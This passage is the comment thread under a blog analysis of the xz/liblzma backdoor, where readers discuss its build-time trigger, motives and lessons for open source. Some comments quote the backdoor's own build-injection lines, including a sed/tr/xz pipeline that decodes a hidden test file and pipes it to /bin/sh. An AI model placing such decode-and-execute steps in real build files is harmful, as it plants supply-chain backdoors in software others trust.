{<div class="text">Very nice analysis.<br/><br/>One small addition.<br/><br/>In build-to-host.m4, the following line returns the filename bad-3-corrupt_lzma2.xz (with directories in front depending on where it&#039;s run, I didn&#039;t check that)<br/><br/>    gl_am_configmake=`grep -aErls &#034;#{4}[[:alnum:]]{5}#{4}$&#034; $srcdir/ 2&gt;/dev/null<br/><br/>this is, to me, the actual start of the attack.<br/><br/>The file bad-3-corrupt_lzma2.xz contains the strings ####Hello#### and ####World#### (second one being followed by a newline) which are (the second one only because of $, to match &#034;end of line&#034;).</div>}
</div>
<div class="comment zebra0"><div class="commentdata">2024-03-30 21:02:39 = <a href="http://">TrojanWoodCombustible</a></div>
{<div class="text">Really nice and high quality analysis, and that&#039;s only the bash part.<br/><br/>It will be very interesting to see what the binary does.</div>}
</div>
<div class="comment zebra1"><div class="commentdata">2024-03-30 21:13:42 = <a href="http://">pnt</a></div>
{<div class="text">Could someone please explain how this concerns sshd in such a way that it can allow a login without prior knowledge of password and password?</div>}
</div>
<div class="comment zebra0"><div class="commentdata">2024-03-30 22:27:19 = <a href="http://">Me</a></div>
{<div class="text">Thank you so much gynvael.<br/><br/>for pnt: I believe the corrupted liblzma_la-crc64-fast.o may be used by sshd and. I think this allows remote code execution when used with a specific key/payload<br/>https://bsky.app/profile/filippo.abyssdomain.expert/post/3kowjkx2njy2b</div>}
</div>
<div class="comment zebra1"><div class="commentdata">2024-03-31 00:12:19 = <a href="https://security.sios.jp/">OMO</a></div>
{<div class="text">It&#039;s really nice analysis! Many thanks!!<br/>I&#039;m very concerned that this malicious code will effect not only for ssh but also others.</div>}
</div>
<div class="comment zebra0"><div class="commentdata">2024-03-31 00:24:40 = <a href="http://">alexshpilkin</a></div>
{<div class="text">Re XORing or not, this is indeed most likely an AWK thing: AWK lacks XOR, it lacks any bitwise operations in fact. It only understands double-precision floating point as far as numbers go, and evidently its authors either did not think of or did not bother to implement the hack JavaScript (and Lua BitOp) later invented for this situation.<br/><br/>Also, once you have the output of a stream cipher, it doesn’t really matter as far as security is concerned if you mix it in using addition mod 2 on the bit stream (i.e. XOR) or addition mod 256 on the byte stream. Aside from compatibility with most premade RC4 encryption routines out there, nothing is lost by the latter option. So if the author of this snippet did not want to spend the bytes on making a table-driven XOR implementation, this seems like a simple and clever solution.</div>}
</div>
<div class="comment zebra1"><div class="commentdata">2024-03-31 01:15:39 = <a href="http://www.emmanueldgz.com">EmmanuelDgz</a></div>
{<div class="text">I thought &#034;simple&#034; attacks were possible only in the 90&#039;s. What a shame using amazing skills for bad.</div>}
</div>
<div class="comment zebra0"><div class="commentdata">2024-03-31 01:50:11 = <a href="http://">ceretullis</a></div>
{<div class="text">Probably a dumb observation... but, could the binary data in the line 2 comment be an IP addresses?<br/><br/>E.g. IPv6 addresses<br/>    from v1<br/>    86f9::5af7:2e68:6abc<br/>    86f9:5af7::2e68:6abc<br/>    86f9:5af7:2e68::6abc<br/><br/>    from v2<br/>    E555::89B7:2404:D817<br/>    E555:89B7::2404:D817<br/>    E555:89B7:2404::D817<br/><br/>Or pairs of IPv4 addresses?<br/>    134.249.90.247   and 46.104.106.188 (v1)<br/>    229.255.137.183 and 36.4.216.23 (v2)<br/> </div>}
</div>
<div class="comment zebra1"><div class="commentdata">2024-03-31 01:56:48 = <a href="http://">somebody</a></div>
{<div class="text">It is terrifying knowing that this was discovered by accident and it makes me wonder what else might be hiding in our systems. Few things are still unclear to me:<br/><br/>  1. &#034;Jia Tan&#034; has 700 commits. How many of these were genuine and when did he start committing malicious code?<br/>  2. Who is Lesse Collins? Is he also an alias of the attacker or is he a real person? He mentioned on the mailing list that he was talking to &#034;Jia Tan&#034; and it is surprising to me that he hasn&#039;t come forward and told us what were these discussions about, and how Jia Tan approached him at first.<br/>  3. What is the likelihood that there may be other yet-to-be-discovered backdoors for the same malicious code he added in xz?<br/>  4. Someone with this level of sophistication is perfectly capable of discovering exploitable vulnerabilities on his own, so what was even the point of going the supply chain route? Unless his target is _everyone_, but I still don&#039;t understand his motivation. It can&#039;t be financial, because his skills can net him a huge amount of money legally. </div>}
</div>
<div class="comment zebra0"><div class="commentdata">2024-03-31 04:42:19 = <a href="http://">Stan</a></div>
{<div class="text">2. Lasse Collins is the maintainer of xz, and apparently a real person. He posted some info on the xz project server: https://tukaani.org/xz-backdoor/ Expect more info in early April<br/>3. There some likelihood there are other backdoors. The distributions are reverting to a version before Jia Tang started work on xz. Lasse Collins already reverted a change that disabled some sandboxing.<br/>4. A nation state may want to target _everyone_. A Remote Command Execution vulnerability in sshd would be extremely valuable.<br/></div>}
</div>
<div class="comment zebra1"><div class="commentdata">2024-03-31 06:58:01 = <a href="http://">tfr</a></div>
{<div class="text">Lasse Collin is the original author of xz. Jia Tan started submitting PR-s and then slowly worked his way up to gaining Lasse&#039;s trust and becoming a package contributor at first and then release manager.<br/><br/>Jia&#039;s and Lasse&#039;s interaction and the backstory is documented pretty well here:<br/>https://boehs.org/node/everything-i-know-about-the-xz-backdoor</div>}
</div>
<div class="comment zebra0"><div class="commentdata">2024-03-31 07:22:06 = <a href="http://">Mention</a></div>
{<div class="text">@somebody Lasse Collins is a real person, a lone OSS developer and a victim in this case. He blogged about this: https://tukaani.org/xz-backdoor/</div>}
</div>
<div class="comment zebra1"><div class="commentdata">2024-03-31 08:51:17 = <a href="http://">Michał</a></div>
{<div class="text">@EmmanuelDgz<br/><br/>Look at the opposite direction you will certainly find shame there. One man to rule them all. What just happened is historic.  Probably an individual action, a human being with patience, simplicity, normality in a world of AI that walks on its head, nothing could be easier to shake.<br/><br/>As for the software, I hope that anew one written from scratch is already underway. You would have to be really stupid to continue using the current software after admitting to not knowing the extent of the damage.</div>}
</div>
<div class="comment zebra0"><div class="commentdata">2024-03-31 09:16:16 = <a href="http://">Michał</a></div>
{<div class="text">@somebody<br/><br/>How do you know he is a victim, maybe he is, but I don&#039;t know and I&#039;m not interested in that because the important thing here is the software and it has been corrupted . The answer is simple and obvious, you have to eliminate this software for a new one that does the same thing. This is why I have no doubt... that the best free and open source developers have already gathered around a table to rewrite one that will do the same thing as the old one and even better.</div>}
</div>
<div class="comment zebra1"><div class="commentdata">2024-03-31 09:21:10 = <a href="http://">ralfj</a></div>
{<div class="text">Thanks for the amazing writeup!<br/><br/>Just one comment, 377 octal is 255 decimal. (The text says it&#039;s 256.)</div>}
</div>
<div class="comment zebra0"><div class="commentdata">2024-03-31 09:22:40 = <a href=".">Gynvael Coldwind</a></div>
{<div class="text">@ralfj<br/>Thanks, fixed!</div>}
</div>
<div class="comment zebra1"><div class="commentdata">2024-03-31 10:10:37 = <a href="http://">fidgetingbits</a></div>
{<div class="text">Nice writeup, thanks for sharing! Typo: &#034;specyfing&#034;</div>}
</div>
<div class="comment zebra0"><div class="commentdata">2024-03-31 10:29:45 = <a href="https://romiras.github.io/projects.html">Romiras</a></div>
{<div class="text">&gt; The first difference are the random bytes in the comment on the second line.<br/><br/>I assume an attacker added it for controlling checksum or something about compression payload.</div>}
</div>
<div class="comment zebra1"><div class="commentdata">2024-03-31 10:57:19 = <a href="http://">doekia</a></div>
{<div class="text">I can&#039;t stop thinking this is a spy agency job. I mean hackers will try to have quick return on investment, while here it is like it does not matter.<br/>This remind me of such spyware #pegasus that use unknown security breach to provide spy service for governmental agencies.<br/><br/>So far Linux is quite &#034;terra incognita&#034; for spy forensic assuming someone want to definitely obfuscate its data content - and implement proper scheme. Such breach is part of an attempt to bridge such gap.<br/></div>}
</div>
<div class="comment zebra0"><div class="commentdata">2024-03-31 11:47:34 = <a href="http://">someone</a></div>
{<div class="text">@somebody<br/>&gt; 4. Someone with this level of sophistication is perfectly capable of discovering exploitable vulnerabilities on his own, so what was even the point of going the supply chain route? Unless his target is _everyone_, but I still don&#039;t understand his motivation. It can&#039;t be financial, because his skills can net him a huge amount of money legally. <br/><br/>It may be easy for you to net a huge amount of money legally using your skills, but not everyone lives in a country where such opportunities are readily available. The world is not a meritocracy, there are hugely talented people who are working for pennies.</div>}
</div>
<div class="comment zebra1"><div class="commentdata">2024-03-31 18:32:30 = <a href="http://">markhahn</a></div>
{<div class="text">The social-engineering part of this is interesting, but I wonder how we can make other aspects more robust.<br/><br/>For instance, this attack gains a lot by use of eval.  Is that sort of usage actually common in this kind of build mechanism?  Restricting builds to simpler tools and safer, less powerful subsets of behavior would make sense to me.  I can&#039;t help think of the old Perl concept of &#034;tainted&#034; content - would that help here?<br/><br/>So much else (like obfuscated pipelines) is tied to the affordances of social-engineering in the maintainer ecosystem.  That few people have a lot of attention to spare, so little things can be smuggled through a chunk at a time.<br/><br/>Very nice writeup, and thanks!</div>}
</div>
<div class="comment zebra0"><div class="commentdata">2024-03-31 19:09:51 = <a href="https://hanwen.home.xs4all.nl/">hanwen</a></div>
{<div class="text">&gt; This code, which I believe is run somewhere during the build process, extracts Stage 1 script. <br/><br/>The step that links liblzma (generating src/liblzma/.libs/liblzma.a among others) looks like:<br/><br/><br/>  echo -n &#039;&#039;; export top_srcdir=&#039;../..&#039;; export CC=&#039;gcc&#039;; ...; export liblzma_la_LIBADD=&#039;&#039;; sed rpath ../../tests/files/bad-3-corrupt_lzma2.xz | tr &#034;&#92;t &#92;-_&#034; &#034; &#92;t_&#92;-&#034; | xz -d 2&gt;/dev/null | /bin/sh &gt;/dev/null 2&gt;&amp;1; /bin/sh ../../libtool  --tag=CC   --mode=link gcc -pthread [snip lots of options]  -o liblzma.la -rpath [lots of object files]<br/><br/>the sed command reading the exploit is appended to the LTDEPS variable in the Makefile, and enters the link command through the  <br/>AM_V_CCLD makefile variable.<br/></div>}
</div>
<div class="comment zebra1"><div class="commentdata">2024-03-31 19:14:58 = <a href="http://">prophet</a></div>
{<div class="text">i think Jia Tan is an AI</div>}
</div>
<div class="comment zebra0"><div class="commentdata">2024-04-01 15:30:14 = <a href="http://">Hibryda</a></div>
{<div class="text">On a more general note, I guess it could be beneficial to test operation of most basal Linux utilities with respect to their performance.<br/>These utilities are meant to be atomic and fast. As the example shows, when there&#039;s a backdoor involved, computation consumption hikes (both at installation and operation) with respect to clean versions.<br/>Any hike between versions should draw attention. Such effort could and should be organized as this particular case can be only a tip of an iceberg.<br/>The proposed solution does not involve code analysis, just behavioral comparison. Code analysis comes later when irregularity is caught. Therefore it&#039;s economically sound and easy to implement.</div>}
</div>
<div class="comment zebra1"><div class="commentdata">2024-04-01 22:15:28 = <a href="http://">Michał</a></div>
{<div class="text">@prophet<br/><br/>I think Jia Tan is a contraction of Jia Le Tan / Tan Jia Le.</div>}
</div>
<div class="comment zebra0"><div class="commentdata">2024-04-02 02:10:43 = <a href="https://github.com/filevich">jpf</a></div>
{<div class="text">&gt; if this was found by accident, how many things still remain undiscovered.<br/><br/>🤯🤯<br/><br/>thanks for the post/explanation!</div>}
</div>
<div class="comment zebra1"><div class="commentdata">2024-04-02 03:40:52 = <a href="http://">Some guy</a></div>
{<div class="text">The mailing list entry about &#034;[PATCH] LZMA_FINISH will now trigger LZMA_BUF_ERROR on truncated xz files right away&#034; is maybe related to &#034;In the last step of this stage the fixed xz byte stream is extracted with errors being ignored (the stream seems to be truncated, but that doesn&#039;t matter as the whole meaningful output has already been written out).&#034;.<br/><br/>Lasse declined that patch in the reply though, as needlessly complex and partly incorrect.</div>}
</div>
<div class="comment zebra0"><div class="commentdata">2024-04-02 09:08:20 = <a href="http://">Phant</a></div>
{<div class="text">I think `sed &#92;&#034;r&#92;n&#92;&#034; $gl_am_configmake` is not as benign as it seems: adding a newline after the last line is only its side effect. It actually appends the content read from the file `&#92;n` (which **currently** does not exist) after each line of the input. I could not find this idiom used anywhere in Gnulib or elsewhere (the normal way to normalize a file to contain a newline at the end with sed seems to be `sed &#039;$a&#92;&#039;`, see &lt;https://stackoverflow.com/a/16198793&gt;), so might have been intentional for further exploitation.</div>}
</div>
<div class="comment zebra1"><div class="commentdata">2024-04-02 10:41:38 = <a href="http://">WhiteLightning</a></div>
{<div class="text">This twit summarizes how it was introduced very nicely: https://twitter.com/fr0gger_/status/1774342248437813525</div>}
</div>
<div class="comment zebra0"><div class="commentdata">2024-04-02 10:44:39 = <a href="http://">SielaQ</a></div>
{<div class="text">&gt; how many things still remain undiscovered.<br/><br/>Even more scary are compliers <br/>if once backdoor would have been introduced there, years ago, unnoticed (like git push -f to hide)<br/>  it could stay forever - self replicating.<br/><br/>Would be also interesting to get the info from github, if they have full history, what has been already hidden by push -f in the xz repo. I wonder if they are able to keep/store every &#034;lost&#034; commits. In such low contributed repo it could be unnoticed by other contributors.</div>}
</div>
<div class="comment zebra1"><div class="commentdata">2024-04-02 11:02:39 = <a href=".">Gynvael Coldwind</a></div>
{<div class="text">@SielaQ<br/>Ah, the good ol&#039; Reflections on Trusting Trust :)</div>}
</div>
<div class="comment zebra0"><div class="commentdata">2024-04-02 16:23:39 = <a href="http://">Jia Tan</a></div>
{<div class="text">Too bad they found it...</div>}
</div>
<div class="comment zebra1"><div class="commentdata">2024-04-02 20:14:54 = <a href="http://">Alexxx</a></div>
{<div class="text">In stage 2 the file called &#034;injected.txt&#034; by Andres, not &#034;infected.txt&#034;.</div>}
</div>
<div class="comment zebra0"><div class="commentdata">2024-04-02 20:43:12 = <a href="http://">chongalicious</a></div>
{<div class="text">Some minor corrections to commenters above:<br/><br/>1. GNU AWK does in fact support XOR; although portability may have been the driving concern for the author in using modular arithmetic.<br/>2. Even though addition is equivalent to XOR over GF(2); it is invalid for any GF(256) which is what the author was attempting to do with the modulus operator.</div>}
</div>
<div class="comment zebra1"><div class="commentdata">2024-04-02 20:43:13 = <a href="http://">chongalicious</a></div>
{<div class="text">Some minor corrections to commenters above:<br/><br/>1. GNU AWK does in fact support XOR; although portability may have been the driving concern for the author in using modular arithmetic.<br/>2. Even though addition is equivalent to XOR over GF(2); it is invalid for any GF(256) which is what the author was attempting to do with the modulus operator.</div>}
</div>
<div class="comment zebra0"><div class="commentdata">2024-04-03 22:33:19 = <a href="http://">cez</a></div>
{<div class="text">But wouldn&#039;t the attacker require the external/public IP of the targets and ssh port opened in wild in order to perform the attack? <br/>How many critical servers do expose standard port 22 on internet? Isn&#039;t very easy to track which source IPs are allowed to connect to an SSH server? (Unless attacket spoofs source IP to mach a legitimate one)<br/>But even then is easy to check all source IPs which connect to ssh.<br/></div>}
</div>
<div class="comment zebra1"><div class="commentdata">2024-04-05 03:21:04 = <a href="http://">GerHobbelt</a></div>
{<div class="text">@cez: not a problem. And the thing is not bound to port 22, it&#039;s bound to SSHd, which can be elsewhere in the port range. Anyway. Once you have this going, you hand a little toolkit (a parallel development, I&#039;m sure) with the right Ed448, etc. built-in, to others for the task of server discovery, no need for your skills there. Give it to a bunch of &#034;affiliate&#034; spammers who are well-versed in portscanning by way of a botnet already. From the victims&#039; perspective nothing out of the ordinary every day, just the regular noisy door-ringing by the internet vandals happening on your server hardware; the wicked bit is that one attempt that makes it through, so to keep that one silent will perhaps need some extra magic in your fast_crc64.o object file. ;-)  Though I&#039;m given to understand this is an RCE approach (https://bsky.app/profile/filippo.abyssdomain.expert/post/3kowjkx2njy2b) so usual access monitoring might very well not catch that one criminal out of many doing something right with your (compromised) machine.<br/><br/>Keep in mind that this is clearly somebody/ies who don&#039;t suffer from corporate next-quarter syndrome nor the limited attention span of a lot of hackers: here&#039;s this nice keyed kit for you, send me (or rather: my boss, do not bother me with the trivial stuff) a list of &#039;discovered&#039; servers every week and keep it going, with some random pauses, for the next year. Here&#039;s a list of IP ranges (owned by company/government X, Y and Z) we&#039;re particularly interested in, and do it all quiet like; do NOT get cocky, ya hear!  Cheerio!<br/><br/>&#034;easy to check all source IPs which connect to ssh&#034;. bye bye. Your attacker is hiding in the loud internet noise. They&#039;re not planning to attain Internet Armageddon by next week.<br/><br/><br/>Back OT: thanks for publishing and the analysis effort, not just here. Frickin&#039; awesome to see it happening. Most CVE&#039;s don&#039;t get published (tech analysis, etc.) at this level, which is a real pity.<br/><br/>And messieurs &#034;Jia Tan&#034;, &#034;Hans Jansen&#034;, et al are having a very bad week. Well, there&#039;s always wodka and then... on to the next crafty idea. Damn, this is some /really/ smart work from their side.  :-)))   Think about it: we read the post-mortem analysis in a few hours, /they/ had to come up with all this shit and make sure it worked on (almost) all systems: that&#039;s some /serious/ dev + test effort!<br/>Obfuscation code like that doesn&#039;t get written in a day. Or a week.<br/><br/><br/>Next thing: I&#039;m very curious what the fallout of all this is going to be long(er) term; I&#039;m a couple days late to the party and already collective stupidity is mounting in the youtube ocean and spilling over; while the original goal may have been thwarted, their benefit long-term is a (my estimate) significant drop in mutual trust in FOSS circles and their consumers/freeloaders, slowing everybody down, or even better, scared chickens reverting to exclusively using vetted closed-source in the trust chain. And all this politically right on time for the new EU CRA+PLA laws under development, jolly good!  I can already see the OGs smile with glee for they know exactly how to handle that scenario; the usual suspects have been top of class in that department since before the Manhattan Project; so nice to be back treading well-known ground. The scare will be so very useful (to them).<br/><br/>Keep publishing.<br/><br/></div>}
</div>
<div class="comment zebra0"><div class="commentdata">2024-04-07 02:14:54 = <a href="http://">Rastagraffix</a></div>
{<div class="text">What&#039;s being missed here is that the core of this attack lies in the GNU autoconf tools. They have grown to such an absurd level of complexity that their output is simply unreadable by mortal humans. I defy you to look at any non-trivial auto* generated Makefile and actually understand it.<br/><br/>This event should be the trigger that leads us to driving a stake through the heart of the zombie that autoconf and its ilk have become. The problem they were designed to address hasn&#039;t existed since the turn of the century. And as others have mentioned - time and again - a great many of the compatibility tests autoconf performs are for systems that are no longer in existence, and would be incapable of running today&#039;s autoconf even if they were.<br/><br/>The sorts of OS-release-specific customization required on modern systems can be handled by short, *simple*, shell scripts.  People just need to (re-)learn how to write portable Makefiles (and code).  I know it&#039;s possible, because I never stopped doing it.</div>}
</div>
<div class="comment zebra1"><div class="commentdata">2024-04-08 05:37:49 = <a href="https://milky.flowers">spinnylights</a></div>
{<div class="text">I feel a bit sheepish posting this comment on a very interesting and detailed technical writeup like this, but after reading the prior comments and similar comments elsewhere I really feel the urge to say: the underlying cause for this attack is social, not technical, and I think it&#039;s a waste of our time and energy regarding this to look for various technical things we don&#039;t like that we might be tempted to blame. It really wasn&#039;t the Autotools, or systemd, or IPv4, or OpenSSL, or the design of XZ Utils overall, or any other tool or library. I understand the temptation, I have my programmers&#039; pet peeves too, but there are really serious _sociocultural_ problems this attack points to and it will be sad to me if nothing changes in that regard. When vital free software projects used on millions of servers are run by overworked lone maintainers in their free time and they barely get any help, appreciation, pay, etc. etc., it creates the possibility for things like this to happen, and _there is no technical solution to that_. You can see just from this writeup alone that the person or people who conducted this attack are witty, skilled, and patient; they could certainly find other ways to slip backdoors into things given the opportunity, even we completely abandoned all of the tools/libraries/protocols/w/e that people want to point their fingers at. To me, the real solution to this is for people to help out more with the free software projects everyone depends on, whatever we might see as their technical shortcomings, whether it be by submitting useful patches, or donating to the maintainer(s), or even just by letting them know that their work is valuable and appreciated.<br/><br/>I agree with @GerHobbelt that this attack has the potential to do a lot of harm to the free software community, also. Having everyone be suspicious of each other might make it a little harder for attacks like this to happen, but probably it will cause more harm than it does good, because we need to be able to trust and work with each other for these projects to stay alive. I kind of doubt that was part of the motivation of the attacker(s)—it seems a lot more likely to me that they just didn&#039;t care, which is really sad—but regardless, I think it&#039;s important that we stick by each other as free software developers and try to find more time to help and support each other.</div>}
</div>
<div class="comment zebra0"><div class="commentdata">2024-04-08 21:38:58 = <a href="http://">Rastagraffix</a></div>
{<div class="text">I&#039;m concerned about topic drift, so I&#039;ll try to be brief ...  But I would argue autotools is a big part of the social aspect of this, even if it is an indirect and inadvertent contributor.<br/><br/>autotools and the like have conditioned us to accept absurd and unnecessary levels of complexity where it is not needed. Part of the reason this attack worked is because the blizzard of noise emitted from the reams of m4 macros hid the shenanigans used to inject the attack.<br/><br/>A simple, human readable and *understandable* configuration system would have made this monkeying around much more obvious, and would likely have precluded this specific attack in the first place. </div>}
</div>
<div class="comment zebra1"><div class="commentdata">2024-04-11 13:33:44 = <a href="http://">klxcrs</a></div>
{<div class="text">Hey, hello! First of all, for me, a complete newb to this kind of sec research, this post was like an oasis, really well explained, thank you very much. There&#039;s something I&#039;ve been wondering:<br/><br/>In Andres&#039; mail it says that this line is added to the top Makefile:<br/><br/>sed rpath ../../../tests/files/bad-3-corrupt_lzma2.xz | tr &#034;	 &#92;-_&#034; &#034; 	_&#92;-&#034; | xz -d | /bin/bash &gt;/dev/null 2&gt;&amp;1;<br/><br/>The result of that leaving out the /bin/bash IS stage 1, correct?<br/><br/>That executes stage 1, which in turn executes stage 2. Stage 2 IS in charge of making the modifications to the Makefile. But to get to this point the Makefile had to be modified already... no?<br/><br/>I&#039;ve been reading by myself and I thought the resulting patched Makefile was a result of running ./configure which runs ./config.status which at the same time has malicious instructions from the M4sh macros that are used to create it. Specifically this one:<br/><br/>if test &#034;x$gl_am_configmake&#034; != &#034;x&#034;; then<br/>    gl_localedir_config=&#039;sed &#92;&#034;r&#92;n&#92;&#034; $gl_am_configmake | eval $gl_path_map | $gl_localedir_prefix -d 2&gt;/dev/null&#039;<br/>#[...] (this is a snippet from the ./configure script)<br/><br/>With $gl_path_map = &#039;tr &#034;&#92;t &#92;-_&#034; &#034; &#92;t_&#92;-&#034;&#039; *** $gl_localedir_prefix = xz *** and $gl_am_configmake being the corrupted ####Hello#### string before the restoration transformation that the &#039;tr&#039; commands performs. So this is ALSO stage 1 only that this time it will be executed in the context of ./configure and not the Makefile) here:<br/><br/>#[...]<br/> eval $gl_config_gt | $SHELL 2&gt;/dev/null ;;<br/>[...]<br/><br/>Having gl_config_gt=&#034;eval &#92;$gl_localedir_config&#034;<br/><br/>So ./configure-&gt;stage1-&gt;stage2-&gt;malicious Makefile generated.<br/>But Makefile-&gt;stage1-&gt;stage2-&gt;Malicious Makefile that I just executed patched again????? wha<br/><br/>I guess it&#039;s something really stupid that I don&#039;t see. All this because I don&#039;t know anything about autotools lol.<br/><br/><br/></div>}
</div>
<div class="comment zebra0"><div class="commentdata">2024-04-25 04:08:43 = <a href="http://">cktse</a></div>
{<div class="text">Thanks for sharing your excellent detailed analysis.</div>}
</div>
<h2>Add a comment:</h2>

<form action="?id=782" method="POST">
  <table>
    <tr><td>Nick:</td><td style="width: 60%"><input name="nick"/></td></tr>
    <tr><td>URL (optional):</td><td style="width: 60%"><input name="url"/></td></tr>
    <tr><td>Math captcha: 9 &lowast; 6 &#xff0b; 5 = </td><td style="width: 60%"><input name="captcha"/></td></tr>
    <tr><td colspan="2">
        <textarea name="text"></textarea>
  <input type="hidden" name="asdf" value="32486d811f9f97cd2fbb38f8bf4862b6"/>
  <input type="submit" class="button" />
</td></tr>
  </table>
</form>
</div></div><div class="clear"></div>
</div>
</body>
</html>
